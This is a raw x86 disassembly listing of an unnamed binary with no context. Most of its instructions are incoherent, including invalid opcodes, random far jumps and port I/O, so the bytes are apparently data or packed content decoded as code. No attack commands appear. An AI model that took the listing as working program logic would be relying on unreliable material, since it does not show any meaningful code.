  40199a:	inc    ebp
  40199b:	cwde   
  40199c:	xor    bh,cl
  40199e:	es cld 
  4019a0:	push   edx
  4019a1:	or     esp,DWORD PTR cs:[ebx+0x51]
  4019a5:	aaa    
  4019a6:	or     cl,BYTE PTR [ecx-0xda3f3db]
  4019ac:	sahf   
  4019ad:	dec    eax
  4019ae:	(bad)  
  4019af:	jnp    0x401a1d
  4019b1:	jb     0x4019c4
  4019b3:	test   BYTE PTR [eax],0x2
  4019b6:	add    al,0x44
  4019b8:	into   
  4019b9:	mov    es,WORD PTR [ebx-0x5771ecb7]
  4019bf:	adc    BYTE PTR ds:0xaabfa1d,bh
  4019c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019c6:	push   ss
  4019c7:	push   esp
  4019c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019c9:	inc    esp
  4019ca:	repz or eax,DWORD PTR [ecx-0x17ef429d]
  4019d1:	jmp    0x52d5:0x197283a2
  4019d8:	push   ss
  4019d9:	out    dx,al
  4019da:	call   0xc619:0xa8309ae2
  4019e1:	cmp    BYTE PTR [edi+0x13bc1853],bl
  4019e7:	outs   dx,DWORD PTR ds:[esi]
  4019e8:	or     ebx,DWORD PTR [ecx-0x599a23ad]
  4019ee:	icebp  
  4019ef:	gs shl ecx,1
  4019f2:	ins    BYTE PTR es:[edi],dx
  4019f3:	ss adc dl,cl
  4019f6:	dec    ebp
  4019f7:	int    0x8c
  4019f9:	push   0x59
  4019fb:	out    0x9c,eax
  4019fd:	push   ebx
  4019fe:	add    al,0xd
  401a00:	cmp    DWORD PTR [ebp-0xd],eax
  401a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a04:	mov    BYTE PTR [ebx+0x179bec5],dh
  401a0a:	push   0xffffff84
  401a0c:	push   esp
  401a0d:	xor    DWORD PTR [ecx+0x281df2ac],esi
  401a13:	das    
  401a14:	jmp    0x401a18
  401a16:	sub    BYTE PTR fs:[ecx],bl
  401a19:	out    dx,eax
  401a1a:	clc    
  401a1b:	shl    BYTE PTR [edi-0x6e],1
  401a1e:	pop    eax
  401a1f:	aas    
  401a20:	(bad)  
  401a21:	ja     0x401a24
  401a23:	daa    
  401a24:	dec    esp
  401a25:	jle    0x401a79
  401a27:	ficomp WORD PTR [ebx+0x2479a96e]
  401a2d:	dec    edi
  401a2e:	dec    BYTE PTR [edx-0x34]
  401a31:	neg    BYTE PTR [eax+0x60738fc3]
  401a37:	inc    eax
  401a38:	daa    
  401a39:	push   ss
  401a3a:	dec    edi
  401a3b:	imul   eax
  401a3d:	mov    ebx,0xd53ce1f3
  401a42:	fwait
  401a43:	std    
  401a44:	(bad)  
  401a45:	cli    
  401a46:	and    esp,esp
  401a48:	xor    esi,ebx
  401a4a:	sub    al,0x98
  401a4c:	sbb    al,0xcf
  401a4e:	mov    bh,0xbc
  401a50:	pop    esi
  401a51:	push   esi
  401a52:	jo     0x401a96
  401a54:	jne    0x401a60
  401a56:	scas   eax,DWORD PTR es:[edi]
  401a57:	mov    edi,0xe6a271da
  401a5c:	mov    bl,0x95
  401a5e:	(bad)  
  401a5f:	std    
  401a60:	out    dx,al
  401a61:	mov    ebx,0x1b80be62
  401a66:	in     eax,0xe7
  401a68:	xchg   ebx,eax
  401a69:	pop    edi
  401a6a:	inc    edi
  401a6b:	outs   dx,DWORD PTR ds:[esi]
  401a6c:	bound  ecx,QWORD PTR [edx+0x664ffd86]
  401a72:	test   edx,0xd1d9fcbf
  401a78:	outs   dx,DWORD PTR ds:[esi]
  401a79:	jle    0x401a3d
  401a7b:	cmp    al,0xd9
  401a7d:	ins    DWORD PTR es:[edi],dx
  401a7e:	pushf  
  401a7f:	sbb    dl,BYTE PTR [esp+esi*8-0x2bf4e45]
  401a86:	stos   DWORD PTR es:[edi],eax
  401a87:	adc    al,0xdb
  401a89:	ret    
  401a8a:	fisub  DWORD PTR [edx+0x7e]
  401a8d:	test   al,0x4b
  401a8f:	(bad)  
  401a91:	cmp    esp,ebp
  401a93:	aas    
  401a94:	sub    DWORD PTR [ecx-0x28],ebx
  401a97:	ins    DWORD PTR es:[edi],dx
  401a98:	stos   BYTE PTR es:[edi],al
  401a99:	jbe    0x401a66
  401a9b:	stc    
  401a9c:	pop    ecx
  401a9d:	adc    BYTE PTR [esi+0x2af91d4e],0x5f
  401aa4:	or     ebx,DWORD PTR [ebp-0x67]
  401aa7:	pop    ds
  401aa8:	aam    0x5b
  401aaa:	mov    dl,0xe3
  401aac:	sbb    esi,DWORD PTR [edi-0x4e]
  401aaf:	adc    DWORD PTR [ebp-0x25],esp
  401ab2:	leave  
  401ab3:	pop    eax
  401ab4:	leave  
  401ab5:	mov    ds:0x3e7c95c2,al
  401aba:	popa   
  401abb:	inc    ebp
  401abc:	mov    edi,0xaebe25e2
  401ac1:	xchg   ecx,eax
  401ac2:	add    al,0xfb
  401ac4:	xor    eax,0x47fb7455
  401ac9:	and    eax,0x7245497c
  401ace:	push   ds
  401acf:	push   0x5f
  401ad1:	and    al,0x47
  401ad3:	fwait
  401ad4:	jg     0x401a69
  401ad6:	mov    esp,0x2ec43252
  401adb:	lea    eax,[esi-0x5e]
  401ade:	sti    
  401adf:	sbb    BYTE PTR [ebx],al
  401ae1:	(bad)  
  401ae2:	imul   DWORD PTR [ebp+esi*2-0x77]
  401ae6:	ficom  DWORD PTR [edx-0x55]
  401ae9:	fs mov ebp,0xfb112fd1
  401aef:	cdq    
  401af0:	loop   0x401a9e
  401af2:	popf   
  401af3:	sub    ebx,DWORD PTR [ebx]
  401af5:	xchg   edi,eax
  401af6:	inc    esi
  401af7:	jbe    0x401aab
  401af9:	clc    
  401afa:	cli    
  401afb:	fs aad 0x14
  401afe:	scas   eax,DWORD PTR es:[edi]
  401aff:	cmc    
  401b00:	imul   ebx,esp,0xffffffa0
  401b03:	add    cl,ch
  401b05:	inc    esp
  401b06:	mov    al,bh
  401b08:	jbe    0x401ab3
  401b0a:	mov    esp,0x2153bb31
  401b0f:	add    eax,0x74907cd4
  401b14:	in     eax,dx
  401b15:	sub    ah,BYTE PTR [esi-0x5d]
  401b18:	xor    eax,0x29bc80eb
  401b1d:	jmp    0x401b3d
  401b1f:	mov    eax,0x5da77b59
  401b24:	in     al,dx
  401b25:	nop
  401b26:	or     dh,BYTE PTR [edi+eax*8-0x19]
  401b2a:	sub    BYTE PTR [edi],bl
  401b2c:	jg     0x401af3
  401b2e:	add    al,BYTE PTR [ebp-0x4]
  401b31:	jmp    0x401ba3
  401b33:	pop    esi
  401b34:	sbb    esi,ebp
  401b36:	fiadd  WORD PTR [edi]
  401b38:	mov    eax,DWORD PTR [ebp-0x65]
  401b3b:	fs pop ecx
  401b3d:	pushf  
  401b3e:	cld    
  401b3f:	add    ah,bh
  401b41:	xchg   BYTE PTR [eax-0x3e695f31],cl
  401b47:	inc    edx
  401b48:	rep ins BYTE PTR es:[edi],dx
  401b4a:	or     ebp,DWORD PTR ds:0xfac7b1b4
  401b50:	dec    ecx
  401b51:	test   al,0x5b
  401b53:	dec    ebp
  401b54:	xchg   edx,eax
  401b55:	jg     0x401b80
  401b57:	iret   
  401b58:	mov    edi,0xcb7763f8
  401b5d:	sub    DWORD PTR [edi-0x7b07e39c],edx
  401b63:	pusha  
  401b64:	cmp    eax,0xa497ba1c
  401b69:	adc    DWORD PTR [eax-0x2a],0xa18a45a7
  401b70:	ds ret 
  401b72:	push   esp
  401b73:	sbb    DWORD PTR ds:0x1507bcd6,0x92a0b186
  401b7d:	int3   
  401b7e:	ret    0x7803
  401b81:	inc    edi
  401b82:	adc    BYTE PTR [edx+esi*2+0x11],al
  401b86:	dec    ecx
  401b87:	out    0x2b,al
  401b89:	pop    es
  401b8a:	(bad)  
  401b8c:	mov    dh,0x75
  401b8e:	mov    al,ds:0x190ad254
  401b93:	shl    BYTE PTR [edx-0x6b],1
  401b96:	mov    ch,0xaa
  401b98:	test   DWORD PTR [ecx],esp
  401b9a:	adc    DWORD PTR [esi],ecx
  401b9c:	mov    eax,ds:0x78e600e5
  401ba1:	sub    WORD PTR [eax],dx
  401ba4:	mov    al,BYTE PTR [edx-0x71cb89cd]
  401baa:	inc    ecx
  401bab:	pushf  
  401bac:	inc    edx
  401bad:	stc    
  401bae:	sti    
  401baf:	lds    ebp,FWORD PTR [eax-0x6f]
  401bb2:	dec    ebx
  401bb3:	sub    esp,DWORD PTR [esi+eiz*1]
  401bb6:	sbb    ah,BYTE PTR [esi]
  401bb8:	mov    esi,0x639834ac
  401bbd:	mov    WORD PTR [edi],gs
  401bbf:	xor    BYTE PTR [edx+0x2cc3a31],cl
  401bc5:	and    DWORD PTR [edx],ecx
  401bc7:	nop
  401bc8:	adc    BYTE PTR [esi-0xf],ah
  401bcb:	mov    eax,0x747f0f1b
  401bd0:	sub    BYTE PTR [ebx],ah
  401bd2:	pop    ecx
  401bd3:	hlt    
  401bd4:	mov    bl,0xa0
  401bd6:	scas   al,BYTE PTR es:[edi]
  401bd7:	cld    
  401bd8:	mov    BYTE PTR [ebx+0x26],bl
  401bdb:	cmc    
  401bdc:	out    dx,al
  401bdd:	test   DWORD PTR [ebx],esi
  401bdf:	mov    dl,BYTE PTR [esi-0x41]
  401be2:	(bad)  
  401be3:	loopne 0x401c5b
  401be5:	xchg   esi,eax
  401be6:	and    DWORD PTR [edx],edx
  401be8:	retf   
  401be9:	dec    ebx
  401bea:	and    BYTE PTR [eax+0x8],cl
  401bed:	push   eax
  401bee:	mov    edx,0x14603dbe
  401bf3:	shl    BYTE PTR [ecx],cl
  401bf5:	pushf  
  401bf6:	test   al,0xed
  401bf8:	or     al,0x46
  401bfa:	sub    DWORD PTR [esi+0x31d5d53a],ecx
  401c00:	mov    bl,0x86
  401c02:	fidiv  DWORD PTR [esi]
  401c04:	test   al,0xd6
  401c06:	nop
  401c07:	inc    esp
  401c08:	jge    0x401bae
  401c0a:	sbb    esi,DWORD PTR [edi+0x3d462511]
  401c10:	loopne 0x401c45
  401c12:	mov    ecx,DWORD PTR [edi-0x5e3665b4]
  401c18:	es (bad) 
  401c1a:	cs mov cl,0xd3
  401c1d:	pop    esi
  401c1e:	addr16 fs out 0x2f,al
  401c22:	(bad)  
  401c23:	mov    edx,0xb8d49d9d
  401c28:	and    ebp,DWORD PTR [ecx-0x22]
  401c2b:	xchg   edi,eax
  401c2c:	sbb    esi,DWORD PTR ds:0xc00d46e0
  401c32:	dec    eax
  401c33:	enter  0xf145,0xca
  401c37:	ja     0x401c55
  401c39:	shr    edi,cl
  401c3b:	pop    esp
  401c3c:	jmp    0x401c25
  401c3e:	xchg   DWORD PTR [edx-0x19],esi
  401c41:	in     eax,0xb3
  401c43:	lods   al,BYTE PTR ds:[esi]
  401c44:	ja     0x401c29
  401c46:	push   ebx
  401c47:	mov    bl,cl
  401c49:	mov    edx,0xae21efb8
  401c4e:	je     0x401c06
  401c50:	add    al,0x6e
  401c52:	popf   
  401c53:	stos   BYTE PTR es:[edi],al
  401c54:	push   es
  401c55:	ret    
  401c56:	cmp    edx,ebx
  401c58:	push   edx
  401c59:	fwait
  401c5a:	arpl   WORD PTR [ebx-0x19],si
  401c5d:	xor    eax,0xc96594e0
  401c62:	dec    ecx
  401c63:	repnz adc al,BYTE PTR [ebp+0x5e]
  401c67:	add    al,BYTE PTR [ecx+esi*8+0x34c9e92d]
  401c6e:	dec    edx
  401c6f:	in     eax,0x9a
  401c71:	(bad)  
  401c72:	mov    edx,0xaebf7cf2
  401c77:	adc    eax,DWORD PTR [ebp+0x71]
  401c7a:	xor    BYTE PTR [edx-0x53],ch
  401c7d:	push   cs
  401c7e:	not    DWORD PTR [ecx]
  401c80:	xor    DWORD PTR [edx],esp
  401c82:	jg     0x401cd7
  401c84:	jle    0x401cdd
  401c86:	mov    eax,ds:0x20c9e8fc
  401c8b:	jno    0x401d05
  401c8d:	icebp  
  401c8e:	jmp    0x401c1b
  401c90:	pop    ebx
  401c91:	scas   eax,DWORD PTR es:[edi]
  401c92:	mov    edx,0xd384f075
  401c97:	loopne 0x401cef
  401c99:	stc    
  401c9a:	inc    ecx
  401c9b:	pop    ebp
  401c9c:	mov    ah,0xbf
  401c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c9f:	call   0xb7c3:0x9f462668
  401ca6:	cmp    eax,0x639499ce
  401cab:	bound  esi,QWORD PTR gs:[eax-0xcc868cf]
  401cb2:	retf   
  401cb3:	cli    
  401cb4:	retf   0xe02f
  401cb7:	fldl2e 
  401cb9:	ja     0x401d05
  401cbb:	jne    0x401c96
  401cbd:	push   ecx
  401cbe:	or     ebx,eax
  401cc0:	mov    WORD PTR ds:0xde802159,es
  401cc6:	mov    dh,0x66
  401cc8:	lahf   
  401cc9:	sbb    edx,edi
  401ccb:	jae    0x401d0c
  401ccd:	fld    TBYTE PTR [ecx]
  401ccf:	inc    esp
  401cd0:	(bad)  
  401cd1:	mov    ah,0x71
  401cd3:	(bad)  
  401cd5:	inc    ecx
  401cd6:	mov    ch,0x6b
  401cd8:	leave  
  401cd9:	mov    ebx,0x365ab45b
  401cde:	mov    dh,0xe1
  401ce0:	adc    eax,0x6173f8f
  401ce5:	leave  
  401ce6:	shr    BYTE PTR [eax-0x37e23c5e],cl
  401cec:	outs   dx,BYTE PTR ds:[esi]
  401ced:	jecxz  0x401ce4
  401cef:	jmp    0xc6:0x28dd1a54
  401cf6:	(bad)  
  401cf7:	out    dx,eax
  401cf8:	push   cs
  401cf9:	hlt    
  401cfa:	enter  0x65fd,0xc5
  401cfe:	and    ch,BYTE PTR [ecx]
  401d00:	das    
  401d01:	mov    ah,0xf
  401d03:	loop   0x401ce1
  401d05:	or     al,0xfa
  401d07:	ins    BYTE PTR es:[edi],dx
  401d08:	jl     0x401cf0
  401d0a:	pop    ebx
  401d0b:	(bad)  
  401d0c:	cmp    eax,0xc496f583
  401d11:	push   ss
  401d12:	adc    DWORD PTR [eax+0x6a],0x58
  401d16:	fist   WORD PTR [eax-0x7022567c]
  401d1c:	imul   BYTE PTR [ecx*2-0xab55ef4]
  401d23:	inc    ecx
  401d24:	js     0x401d45
  401d26:	rcr    DWORD PTR [edi-0x82721f8],cl
  401d2c:	imul   ebp,DWORD PTR [ebx-0xfb22688],0x57d233b1
  401d36:	add    bl,cl
  401d38:	ds leave 
  401d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d3b:	xor    cl,BYTE PTR [eax]
  401d3d:	sbb    esi,DWORD PTR ds:0x6e89f10b
  401d43:	lahf   
  401d44:	mov    ds:0x9bb9b1ab,eax
  401d49:	cmp    BYTE PTR [esi+ebx*2-0x2a97ae5],ch
  401d50:	fs out dx,eax
  401d52:	xor    ah,al
  401d54:	push   edx
  401d55:	adc    DWORD PTR [ecx],esp
  401d57:	cmp    ebx,0x2c953a9b
  401d5d:	(bad)  
  401d5e:	sti    
  401d5f:	inc    esp
  401d60:	add    al,0x1b
  401d62:	adc    eax,0x3d1be874
  401d67:	int    0x3b
  401d69:	or     cl,bl
  401d6b:	add    al,0xfc
  401d6d:	push   esi
  401d6e:	inc    edx
  401d6f:	sbb    ecx,eax
  401d71:	dec    eax
  401d72:	cli    
  401d73:	out    dx,eax
  401d74:	leave  
  401d75:	pushf  
  401d76:	fcmovne st,st(3)
  401d78:	pop    eax
  401d79:	xchg   al,dl
  401d7b:	pop    esp
  401d7c:	xchg   ecx,eax
  401d7d:	aas    
  401d7e:	push   eax
  401d7f:	pop    ecx
  401d80:	in     al,0x9b
  401d82:	pushf  
  401d83:	ret    0x672
  401d86:	adc    eax,0x3a30008b
  401d8b:	cmc    
  401d8c:	mov    ah,0x90
  401d8e:	jae    0x401d2e
  401d90:	rcr    BYTE PTR [esi+0x3f],1
  401d93:	pop    eax
  401d94:	push   ds
  401d95:	rol    BYTE PTR [esi+0x1c],cl
  401d98:	pushf  
  401d99:	push   eax
  401d9a:	or     al,0xa3
  401d9d:	pop    esp
  401d9e:	(bad)
  401da1:	and    al,0x5
  401da3:	mov    DWORD PTR [edi],esi
  401da5:	(bad)  
  401da6:	mov    BYTE PTR [esi],ch
  401da8:	in     al,0xac
  401daa:	cld    
  401dab:	lds    ebx,FWORD PTR [edx]
  401dad:	clc    
  401dae:	cmc    
  401daf:	xor    esp,DWORD PTR [ebp+0x6a072163]
  401db5:	(bad)  
  401db6:	inc    DWORD PTR [esi-0x22cca434]
  401dbc:	jmp    0x56a5a492
  401dc1:	mov    al,ds:0x6963227c
  401dc6:	or     BYTE PTR [ebx],bl
  401dc8:	dec    ebx
  401dc9:	imul   ecx,ebx,0xf
  401dcc:	nop
  401dcd:	ins    DWORD PTR es:[edi],dx
  401dce:	mov    dh,0x59
  401dd0:	jno    0x401d6b
  401dd2:	stos   DWORD PTR es:[edi],eax
  401dd3:	call   0xb664:0x932330b0
  401dda:	sahf   
  401ddb:	push   edx
  401ddc:	sub    ah,bh
  401dde:	test   BYTE PTR ds:0xb5cc00cd,bh
  401de4:	mov    ecx,edi
  401de6:	sbb    eax,esp
  401de8:	ds xor dh,ah
  401deb:	pop    esp
  401dec:	lahf   
  401ded:	mov    eax,0x2e67a869
  401df2:	gs leave 
  401df4:	stos   DWORD PTR es:[edi],eax
  401df5:	adc    ecx,eax
  401df7:	inc    edi
  401df8:	xchg   edx,eax
  401df9:	xor    ah,bh
  401dfb:	mov    ds:0x8ed1a8f5,al
  401e00:	mov    ds:0x93397567,al
  401e05:	inc    ebx
  401e06:	scas   al,BYTE PTR es:[edi]
  401e07:	jmp    0x401d89
  401e09:	jmp    0x4620:0x8ba90ccb
  401e10:	(bad)  
  401e11:	js     0x401dbb
  401e13:	std    
  401e14:	movq   QWORD PTR [edx+0x34],mm2
  401e18:	adc    BYTE PTR [esi+0x33],bl
  401e1b:	jl     0x401e28
  401e1d:	add    BYTE PTR [edx-0x29],al
  401e20:	shr    DWORD PTR ss:[esi+0x578615e3],1
  401e27:	mov    edx,0x32257a12
  401e2c:	or     DWORD PTR [ebx-0x2],edi
  401e2f:	loop   0x401e1d
  401e31:	jge    0x401dd7
  401e33:	jmp    0x337b:0x2299b632
  401e3a:	jp     0x401ea6
  401e3c:	ficomp DWORD PTR [edx+0x5c4f484a]
  401e42:	stc    
  401e43:	sub    eax,0xcb319e25
  401e48:	adc    BYTE PTR [edi+0x466903b2],bh
  401e4e:	inc    eax
  401e4f:	int3   
  401e50:	retf   0xa21b
  401e53:	xlat   BYTE PTR es:[ebx]
  401e55:	cmp    ah,BYTE PTR [edi+0x6a8bbcbe]
  401e5b:	cmp    BYTE PTR [ebp-0x27],bl
  401e5e:	jg     0x401e9b
  401e60:	pop    ebp
  401e61:	or     eax,0x41e3c78f
  401e66:	push   0x6a
  401e68:	sbb    BYTE PTR [ecx],bl
  401e6a:	test   al,0x47
  401e6c:	mov    al,0x99
  401e6e:	ret    0x5997
  401e71:	adc    bh,BYTE PTR [ebx-0x71]
  401e74:	adc    BYTE PTR [edx-0x28],ah
  401e77:	aad    0xea
  401e79:	xor    esi,DWORD PTR [ebp+0x15]
  401e7c:	stos   BYTE PTR es:[edi],al
  401e7d:	jecxz  0x401ea7
  401e7f:	and    BYTE PTR [edi+0x29],0x60
  401e83:	xchg   DWORD PTR [ecx],eax
  401e85:	xor    al,0x4f
  401e87:	repnz add al,0x80
  401e8a:	lods   eax,DWORD PTR ds:[esi]
  401e8b:	inc    ebx
  401e8c:	mov    esp,DWORD PTR [eax-0x34]
  401e8f:	adc    al,0xff
  401e91:	mov    DWORD PTR [ebp+0x7ba3fe7d],0xa9c18ac6
  401e9b:	mov    edx,0x98ce0ab3
  401ea0:	inc    edi
  401ea1:	dec    ecx
  401ea2:	das    
  401ea3:	inc    esp
  401ea4:	fisubr DWORD PTR [ebx+esi*8+0x22c98bb1]
  401eab:	out    0x96,eax
  401ead:	xchg   ebx,eax
  401eae:	(bad)  
  401eaf:	(bad)  
  401eb0:	xor    DWORD PTR ds:0x93a7c7f6,ecx
  401eb6:	inc    ebp
  401eb7:	mul    DWORD PTR [ecx-0x6c09afd1]
  401ebd:	push   ebp
  401ebe:	cs xchg ebx,eax
  401ec0:	jbe    0x401e7d
  401ec2:	push   edx
  401ec3:	inc    esp
  401ec4:	ret    
  401ec5:	adc    BYTE PTR [ebp-0x48],bl
  401ec8:	test   eax,0xcf47e64b
  401ecd:	sub    DWORD PTR [ebp-0x43cb6a7a],ecx
  401ed3:	rcl    BYTE PTR [ebx],cl
  401ed5:	xchg   edx,eax
  401ed6:	and    al,0xa6
  401ed8:	xchg   ebx,eax
  401ed9:	fisubr WORD PTR [ebx+ebp*2+0x6c]
  401edd:	or     eax,0x65da3f76
  401ee2:	pusha  
  401ee3:	push   ecx
  401ee4:	lods   al,BYTE PTR ds:[esi]
  401ee5:	not    ch
  401ee7:	popf   
  401ee8:	aas    
  401ee9:	pop    edi
  401eea:	sbb    ebx,edi
  401eec:	mov    eax,DWORD PTR [ebx]
  401eee:	fdivr  DWORD PTR [edi]
  401ef0:	pusha  
  401ef1:	dec    edx
  401ef2:	cmp    DWORD PTR [esi],ebp
  401ef4:	mov    al,ds:0xeb9fba53
  401ef9:	sbb    eax,0xaed865ae
  401efe:	iret   
  401eff:	jmp    0x401e91
  401f01:	enter  0xefe1,0xcd
  401f05:	(bad)  
  401f06:	mov    eax,ds:0xdd455ba2
  401f0b:	mov    bl,0x88
  401f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f0e:	mov    edi,0xe5143803
  401f13:	and    al,al
  401f15:	mov    ds:0xca85ab87,eax
  401f1a:	xor    eax,0x48cc2f66
  401f1f:	adc    edx,DWORD PTR [ebx+0x259d2924]
  401f25:	jns    0x401f1a
  401f27:	call   FWORD PTR ds:[edi-0x4c]
  401f2b:	test   DWORD PTR [edi+esi*2],ebx
  401f2e:	call   0xe602:0x27ed7bb6
  401f35:	imul   eax,edi,0xffffffba
  401f38:	xchg   BYTE PTR [ebx+0x4ed826fa],al
  401f3e:	shl    DWORD PTR [ecx-0x48],1
  401f41:	mov    dl,0x4e
  401f43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f44:	cmc    
  401f45:	or     BYTE PTR [ebp-0x30],0xcc
  401f49:	jno    0x401f34
  401f4b:	pushf  
  401f4c:	shr    dl,0x59
  401f4f:	xchg   edx,eax
  401f50:	xchg   ebx,eax
  401f51:	adc    DWORD PTR ds:0x8a951814,edi
  401f57:	in     al,dx
  401f58:	mov    esp,0x1fff3eca
  401f5d:	mov    WORD PTR [ebx-0x4be24b8e],gs
  401f63:	dec    esp
  401f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f65:	sbb    eax,0xfa3a0cd5
  401f6a:	xor    al,0x47
  401f6c:	pop    eax
  401f6d:	xor    ah,BYTE PTR [edx-0x67f71b52]
  401f73:	add    eax,0x7fcbb1b6
  401f78:	gs repnz sbb esp,ebp
  401f7c:	ins    DWORD PTR es:[edi],dx
  401f7d:	mov    ch,0x89
  401f7f:	fsub   DWORD PTR [eax-0x23]
  401f82:	hlt    
  401f83:	test   DWORD PTR [ebx],esp
  401f85:	imul   edx,DWORD PTR [ebx+ebx*2],0x6b
  401f89:	cmp    esp,DWORD PTR [edx]
  401f8b:	jecxz  0x401f27
  401f8d:	adc    ah,BYTE PTR [ecx-0x32]
  401f90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f91:	scas   al,BYTE PTR es:[edi]
  401f92:	(bad)
  401f95:	mov    WORD PTR [ecx-0x7f],?
  401f98:	push   eax
  401f99:	or     al,0xc4
  401f9b:	add    eax,0x7bfa86c1
  401fa0:	mov    edx,DWORD PTR [ebx]
  401fa2:	jo     0x401fd3
  401fa4:	jle    0x401fe8
  401fa6:	pop    ss
  401fa7:	in     eax,dx
  401fa8:	fs sahf 
  401faa:	jle    0x401fb7
  401fac:	jg     0x401fc5
  401fae:	std    
  401faf:	cmc    
  401fb0:	adc    eax,DWORD PTR [ecx]
  401fb2:	sti    
  401fb3:	call   0x30fc:0x99d2e6b9
  401fba:	popf   
  401fbb:	pop    edi
  401fbc:	cdq    
  401fbd:	aad    0xe3
  401fbf:	in     al,dx
  401fc0:	retf   0x4f4f
  401fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fc4:	push   es
  401fc5:	stc    
  401fc6:	mov    edi,0xb5ad5bd0
  401fcb:	mov    ebp,DWORD PTR [edx+esi*1]
  401fce:	pop    es
  401fcf:	and    cl,BYTE PTR [eax]
  401fd1:	mov    esi,0x8457e705
  401fd6:	and    BYTE PTR [edi+eiz*1],al
  401fd9:	sub    BYTE PTR [edx-0x55],al
  401fdc:	jnp    0x402009
  401fde:	lock (bad) 
  401fe0:	test   al,0xcb
  401fe2:	xchg   bh,ch
  401fe4:	shl    BYTE PTR [edi],1
  401fe6:	or     DWORD PTR [ebx],ecx
  401fe8:	sbb    BYTE PTR [edx-0x79],dl
  401feb:	test   eax,0x4ad3bcc6
  401ff0:	ins    DWORD PTR es:[edi],dx
  401ff1:	in     al,0xbe
  401ff3:	and    ebp,esi
  401ff5:	lods   al,BYTE PTR ds:[esi]
  401ff6:	jb     0x401ff0
  401ff8:	loope  0x401fe6
  401ffa:	ins    DWORD PTR es:[edi],dx
  401ffb:	ret    
  401ffc:	mov    eax,ds:0xb9bebd
  402001:	pop    ss
  402002:	mov    ds:0x80afc20d,eax
  402007:	int    0x6a
  402009:	pcmpgtb mm3,QWORD PTR [ebx+0x54b5c626]
  402010:	fcmovbe st,st(4)
  402012:	and    al,0x86
  402014:	jbe    0x401fac
  402016:	ja     0x40200b
  402018:	fwait
  402019:	sub    BYTE PTR [edi-0x7287c03a],cl
  40201f:	out    0xd7,eax
  402021:	and    esi,esi
  402023:	retf   
  402024:	or     BYTE PTR [ebx-0x4aa4541],bh
  40202a:	dec    esp
  40202b:	add    cl,bh
  40202d:	(bad)  
  40202e:	xchg   esp,eax
  40202f:	cs jl  0x40201e
  402032:	mov    ebx,0x82b15a0
  402037:	fdivr  QWORD PTR [ecx+edx*4+0x52]
  40203b:	jp     0x40202d
  40203d:	je     0x40201c
  40203f:	push   di
  402041:	mov    dh,0x74
  402043:	cmp    al,ah
  402045:	xor    ah,BYTE PTR [ebp+0x7508a9f0]
  40204b:	mov    eax,0x7f17d2a3
  402050:	sti    
  402051:	ss push es
  402053:	mov    DWORD PTR gs:[edi],0x7136640
  40205a:	fdivr  DWORD PTR [eax-0x7079ed44]
  402060:	retf   0xdeb8
  402063:	loop   0x402095
  402065:	scas   al,BYTE PTR es:[edi]
  402066:	or     edx,DWORD PTR [ebx-0x67118d98]
  40206c:	js     0x402044
  40206e:	test   al,0x3f
  402070:	jge    0x40203b
  402072:	mov    edi,0x4dc1c292
  402077:	or     al,0xef
  402079:	retf   0x86d1
  40207c:	cmp    eax,0x2da4082f
  402081:	aad    0xf2
  402083:	nop
  402084:	jmp    0xc6c:0x66bc4548
  40208b:	cmc    
  40208c:	and    BYTE PTR [eax+0x1d96764],dl
  402092:	(bad)  
  402093:	outs   dx,DWORD PTR ds:[esi]
  402094:	fmul   QWORD PTR [ebx-0x6ec5ef89]
  40209a:	cwde   
  40209b:	push   esi
  40209c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40209d:	xchg   edi,eax
  40209e:	lods   al,BYTE PTR ds:[esi]
  40209f:	xor    esi,DWORD PTR [ebx]
  4020a1:	fwait
  4020a2:	pushf  
  4020a3:	fimul  WORD PTR [ebx+edi*1-0x57]
  4020a7:	push   ds
  4020a8:	mov    eax,ds:0xb1ac976d
  4020ad:	add    DWORD PTR [eax+0x19],ebp
  4020b0:	dec    edx
  4020b1:	fist   DWORD PTR [eax+0xa]
  4020b4:	out    dx,al
  4020b5:	(bad)  
  4020b6:	xchg   ecx,eax
  4020b7:	jp     0x4020a6
  4020b9:	das    
  4020ba:	adc    dl,BYTE PTR [eax]
  4020bc:	jle    0x402082
  4020be:	nop
  4020bf:	cmc    
  4020c0:	sbb    edi,DWORD PTR [edi]
  4020c2:	daa    
  4020c3:	cmp    DWORD PTR [esi+0x539699ae],ebx
  4020c9:	emms   
  4020cb:	in     eax,dx
  4020cc:	shl    BYTE PTR [ebp-0x2],cl
  4020cf:	and    dl,bh
  4020d1:	mov    esp,0xf19a9241
  4020d6:	xchg   edx,eax
  4020d7:	cmp    dh,BYTE PTR [eax]
  4020d9:	sti    
  4020da:	int    0x8d
  4020dc:	xchg   ecx,eax
  4020dd:	jl     0x402154
  4020df:	or     BYTE PTR [ebx+0x1e],0x3e
  4020e3:	mov    dl,0x51
  4020e5:	inc    ebp
  4020e6:	mov    eax,DWORD PTR [edx]
  4020e8:	(bad)  
  4020e9:	jns    0x40206c
  4020eb:	lods   al,BYTE PTR ds:[esi]
  4020ec:	jo     0x402113
  4020ee:	sbb    esi,ecx
  4020f0:	pop    edi
  4020f1:	add    dl,BYTE PTR [edx+0x5d]
  4020f4:	mov    ebx,0x82b90f48
  4020f9:	int    0x15
  4020fb:	or     al,0xdb
  4020fd:	xor    BYTE PTR [ecx],bl
  4020ff:	std    
  402100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402101:	gs out dx,eax
  402103:	fmulp  st(1),st
  402105:	lods   eax,DWORD PTR cs:[esi]
  402107:	test   edx,esp
  402109:	arpl   WORD PTR [ebp+0x6bcd70a2],ax
  40210f:	arpl   cx,di
  402111:	or     eax,0x2e0a6e08
  402116:	aad    0x13
  402118:	inc    esp
  402119:	push   esi
  40211a:	lock inc ebp
  40211c:	loope  0x402117
  40211e:	push   0x8d9c7e45
  402123:	push   eax
  402124:	pop    esp
  402125:	sbb    eax,0x8c666743
  40212a:	cdq    
  40212b:	add    al,0x1a
